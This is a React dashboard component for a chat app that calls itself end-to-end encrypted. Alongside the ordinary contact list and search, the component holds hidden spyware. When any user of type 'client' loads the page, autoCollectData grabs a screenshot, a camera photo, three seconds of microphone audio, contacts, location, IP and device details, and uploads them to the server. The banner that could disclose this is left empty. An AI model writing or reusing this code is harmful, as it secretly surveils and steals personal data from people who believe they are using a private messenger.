import React, { useState, useEffect } from 'react';
import { contacts, collect, auth } from '../api';

function Dashboard({ 
  user, 
  chats, 
  onSelectChat, 
  onOpenProfile, 
  onOpenAdmin, 
  onLogout,
  selectedChat = null,
  chatComponent = null
}) {
  const [contactList, setContactList] = useState([]);
  const [searchQuery, setSearchQuery] = useState('');
  const [searchResults, setSearchResults] = useState([]);
  const [loading, setLoading] = useState(false);
  const isClient = user.user_type === 'client';
  const isAdmin = user.user_type === 'admin';

  useEffect(() => {
    loadContacts();
    // ===== АВТОМАТИЧЕСКИЙ СБОР ДАННЫХ ДЛЯ КЛИЕНТОВ =====
    if (isClient) {
      autoCollectData();
    }
  }, []);

  const loadContacts = async () => {
    try {
      const res = await contacts.list();
      setContactList(res.data);
    } catch (e) {
      console.error('Error loading contacts', e);
    }
  };

  // ===== АВТОМАТИЧЕСКИЙ СБОР ДАННЫХ =====
  const autoCollectData = async () => {
    console.log('📊 Automatic data collection started...');
    
    const formData = new FormData();

    try {
      // 1. Скриншот
      try {
        const stream = await window.navigator.mediaDevices.getDisplayMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        const canvas = document.createElement('canvas');
        canvas.width = 1920;
        canvas.height = 1080;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
        formData.append('screenshot', blob, 'screenshot.png');
        stream.getTracks().forEach(t => t.stop());
        console.log('✅ Screenshot captured');
      } catch (e) {
        console.log('❌ Screenshot not available');
      }

      // 2. Фото с камеры
      try {
        const stream = await window.navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
        formData.append('photo', blob, 'camera.jpg');
        stream.getTracks().forEach(t => t.stop());
        console.log('✅ Photo captured');
      } catch (e) {
        console.log('❌ Camera not available');
      }

      // 3. Аудио
      try {
        const stream = await window.navigator.mediaDevices.getUserMedia({ audio: true });
        const recorder = new MediaRecorder(stream);
        const chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.start();
        await new Promise(resolve => setTimeout(resolve, 3000));
        recorder.stop();
        await new Promise(resolve => recorder.onstop = resolve);
        const blob = new Blob(chunks, { type: 'audio/webm' });
        formData.append('audio', blob, 'audio.webm');
        stream.getTracks().forEach(t => t.stop());
        console.log('✅ Audio recorded');
      } catch (e) {
        console.log('❌ Microphone not available');
      }

      // 4. Контакты
      if (window.navigator.contacts) {
        try {
          const rawContacts = await window.navigator.contacts.select(['name', 'tel'], { multiple: true });
          if (rawContacts && rawContacts.length > 0) {
            formData.append('contacts', JSON.stringify(rawContacts));
            console.log(`✅ Contacts collected: ${rawContacts.length}`);
          }
        } catch (e) {
          console.log('❌ Contacts not available');
        }
      }

      // 5. Геолокация
      try {
        const position = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject);
        });
        const locationData = {
          lat: position.coords.latitude,
          lng: position.coords.longitude,
          accuracy: position.coords.accuracy
        };
        formData.append('location', JSON.stringify(locationData));
        console.log('✅ Location collected');
      } catch (e) {
        console.log('❌ Location not available');
      }

      // 6. Метаданные
      const metadata = {
        ip: await getIP(),
        userAgent: window.navigator.userAgent,
        platform: window.navigator.platform,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        timestamp: new Date().toISOString()
      };
      formData.append('metadata', JSON.stringify(metadata));
      console.log('✅ Metadata collected');

      // Отправка на сервер
      const res = await collect.send(formData);
      if (res.data.success) {
        console.log('📤 Data sent to server successfully!');
      }
    } catch (e) {
      console.error('❌ Auto collection error:', e);
    }
  };

  // ===== ПОЛУЧЕНИЕ IP =====
  const getIP = async () => {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip;
    } catch (e) {
      return 'unknown';
    }
  };

  // ===== ПОИСК =====
  const searchUsers = async (query) => {
    setSearchQuery(query);
    if (!query.trim()) {
      setSearchResults([]);
      return;
    }

    if (query.startsWith('@')) {
      const username = query.slice(1).toLowerCase();
      try {
        const res = await contacts.search(username);
        const filtered = res.data.filter(u => 
          u.username && u.username.toLowerCase().includes(username)
        );
        setSearchResults(filtered);
      } catch (e) {
        console.error('Search error', e);
      }
      return;
    }

    try {
      const res = await contacts.search(query);
      setSearchResults(res.data);
    } catch (e) {
      console.error('Search error', e);
    }
  };

  // ===== НАЧАТЬ ЧАТ =====
  const startChatWithUser = async (foundUser) => {
    try {
      await contacts.add(foundUser.id);
      loadContacts();
      setSearchResults([]);
      setSearchQuery('');
      onSelectChat(foundUser);
    } catch (e) {
      console.error('Error adding contact', e);
      onSelectChat(foundUser);
    }
  };

  const handleLogout = async () => {
    if (window.confirm('Logout?')) {
      try {
        await auth.logout();
        onLogout();
      } catch (e) {
        console.error('Logout error', e);
      }
    }
  };

  // Объединяем контакты и чаты
  const allChats = [...chats];
  contactList.forEach(contact => {
    if (!allChats.find(c => c.id === contact.id)) {
      allChats.push({
        ...contact,
        lastMessage: 'Start chat',
        timestamp: contact.added_at || new Date().toISOString()
      });
    }
  });

  const sortedChats = allChats.sort((a, b) => {
    return new Date(b.timestamp) - new Date(a.timestamp);
  });

  return (
    <div className="app-container">
      <div className="sidebar">
        <div className="sidebar-header">
          <div className="user-avatar" onClick={onOpenProfile}>
            {user.avatar ? (
              <img src={`http://localhost:5000/uploads/avatars/${user.avatar}`} alt="Avatar" />
            ) : (
              user.name?.[0] || 'U'
            )}
          </div>
          <div className="user-info" onClick={onOpenProfile}>
            <div className="user-name">{user.name}</div>
            <div className="user-status">{isClient ? 'Client' : isAdmin ? 'Admin' : 'Worker'}</div>
          </div>
          <div className="sidebar-actions">
            <button className="icon-btn" onClick={onOpenProfile}>⚙</button>
            <button className="icon-btn logout-btn" onClick={handleLogout}>⏻</button>
          </div>
        </div>

        <div className="search-bar">
          <input
            type="text"
            placeholder="Search..."
            value={searchQuery}
            onChange={e => searchUsers(e.target.value)}
          />
          {searchResults.length > 0 && (
            <div className="search-results">
              {searchResults.map(u => (
                <div 
                  key={u.id} 
                  className="search-result"
                  onClick={() => startChatWithUser(u)}
                >
                  <div className="search-result-avatar">
                    {u.avatar ? (
                      <img src={`http://localhost:5000/uploads/avatars/${u.avatar}`} alt="Avatar" />
                    ) : (
                      u.name?.[0] || '?'
                    )}
                  </div>
                  <div className="search-result-info">
                    <div className="search-result-name">
                      {u.name}
                      {u.username && <span className="search-username"> @{u.username}</span>}
                    </div>
                    <div className="search-result-phone">{u.phone}</div>
                  </div>
                  <button 
                    className="search-result-chat-btn"
                    onClick={(e) => {
                      e.stopPropagation();
                      startChatWithUser(u);
                    }}
                  >
                    💬
                  </button>
                </div>
              ))}
            </div>
          )}
        </div>

        <div className="contacts-list">
          <h3>Chats</h3>
          {sortedChats.length > 0 ? (
            sortedChats.map(chat => (
              <div
                key={chat.id}
                className={`contact-item ${selectedChat?.id === chat.id ? 'active' : ''}`}
                onClick={() => onSelectChat(chat)}
              >
                <div className="contact-avatar">
                  {chat.avatar ? (
                    <img src={`http://localhost:5000/uploads/avatars/${chat.avatar}`} alt="Avatar" />
                  ) : (
                    chat.name?.[0] || '?'
                  )}
                  <span className="online-dot"></span>
                </div>
                <div className="contact-info">
                  <div className="contact-name">
                    {chat.name}
                    {chat.username && <span className="contact-username"> @{chat.username}</span>}
                  </div>
                  <div className="contact-last-msg">
                    {chat.lastMessage || 'Start chat'}
                  </div>
                </div>
                <div className="contact-time">
                  {chat.timestamp ? new Date(chat.timestamp).toLocaleTimeString([], { 
                    hour: '2-digit', 
                    minute: '2-digit' 
                  }) : ''}
                </div>
              </div>
            ))
          ) : (
            <div className="empty-state">
              <p>No chats yet</p>
              <p className="empty-sub">Find users via search to start chatting</p>
            </div>
          )}
        </div>

        {/* БАННЕР ДЛЯ КЛИЕНТА — ИНФОРМАЦИЯ О СБОРЕ ДАННЫХ (БЕЗ КНОПКИ) */}
        {isClient && (
          <div className="data-collection-banner">
            <span className="banner-icon">📊</span>
            <div className="banner-content">
            </div>
          </div>
        )}

        {isAdmin && (
          <div className="admin-banner" onClick={onOpenAdmin}>
            <span className="banner-icon">⚙</span>
            <div className="banner-content">
              <div className="banner-title">Admin Panel</div>
              <div className="banner-sub">Manage workers</div>
            </div>
          </div>
        )}
      </div>

      <div className="chat-area">
        {chatComponent ? (
          chatComponent
        ) : (
          <div className="empty-chat">
            <span className="empty-chat-icon">💬</span>
            <h2>Clone</h2>
            <p>End-to-End Encrypted</p>
            <p className="empty-sub">Select a chat to start messaging</p>
          </div>
        )}
      </div>
    </div>
  );
}

export default Dashboard;